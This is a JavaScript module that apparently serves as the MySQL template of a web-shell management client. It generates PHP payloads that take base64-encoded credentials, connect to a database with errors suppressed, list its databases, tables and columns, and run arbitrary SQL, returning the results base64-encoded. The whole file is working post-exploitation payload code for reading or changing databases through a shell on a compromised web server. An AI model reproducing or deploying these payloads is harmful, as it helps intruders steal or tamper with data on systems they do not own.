/**
 * 数据库管理模板::mysql
 * i 数据分隔符号 => \t|\t
 */

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  // 显示所有数据库
  show_databases: {
    _: `
    $hst=base64_decode("#{base64::host}");
    $usr=base64_decode("#{base64::user}");
    $pwd=base64_decode("#{base64::passwd}");
    $T=@mysql_connect($hst,$usr,$pwd);
    $q=@mysql_query("SHOW DATABASES");
    while($rs=@mysql_fetch_row($q)){
      echo(trim($rs[0]).chr(9));
    }
    @mysql_close($T);`.replace(/\n\s+/g, ''),
  },
  // 显示数据库所有表
  show_tables: {
    _: `
    $hst=base64_decode("#{base64::host}");
    $usr=base64_decode("#{base64::user}");
    $pwd=base64_decode("#{base64::passwd}");
    $dbn=base64_decode("#{base64::db}");
    $T=@mysql_connect($hst,$usr,$pwd);
    $q=@mysql_query("SHOW TABLES FROM \`{$dbn}\`");
    while($rs=@mysql_fetch_row($q)){
      echo(trim($rs[0]).chr(9));
    }
    @mysql_close($T);`.replace(/\n\s+/g, ''),
  },
  // 显示表字段
  show_columns: {
    _: `
    $hst=base64_decode("#{base64::host}");
    $usr=base64_decode("#{base64::user}");
    $pwd=base64_decode("#{base64::passwd}");
    $dbn=base64_decode("#{base64::db}");
    $tab=base64_decode("#{base64::table}");
    $T=@mysql_connect($hst,$usr,$pwd);
    @mysql_select_db( $dbn, $T);
    $q=@mysql_query("SHOW COLUMNS FROM \`{$tab}\`");
    while($rs=@mysql_fetch_row($q)){
      echo(trim($rs[0])." (".$rs[1].")".chr(9));
    }
    @mysql_close($T);`.replace(/\n\s+/g, ''),
  },
  // 执行SQL语句
  query: {
    _: `
    $hst=base64_decode("#{base64::host}");
    $usr=base64_decode("#{base64::user}");
    $pwd=base64_decode("#{base64::passwd}");
    $dbn=base64_decode("#{base64::db}");
    $sql=base64_decode("#{base64::sql}");
    $T=@mysql_connect($hst,$usr,$pwd);
    @mysql_query("SET NAMES ".base64_decode("#{base64::encode}"));
    @mysql_select_db($dbn, $T);
    $q=@mysql_query($sql);
    if(is_bool($q)){
      echo("Status\\t|\\t\\r\\n".($q?"VHJ1ZQ==":"RmFsc2U=")."\\t|\\t\\r\\n");
    }else{
      $i=0;
      while($col=@mysql_fetch_field($q)){
        echo($col->name."\\t|\\t");
        $i++;
      }
      echo("\\r\\n");
      while($rs=@mysql_fetch_row($q)){
        for($c=0;$c<$i;$c++){
          echo(base64_encode(trim($rs[$c])));
          echo("\\t|\\t");
        }
        echo("\\r\\n");
      }
    }
    @mysql_close($T);`.replace(/\n\s+/g, ''),
  }
})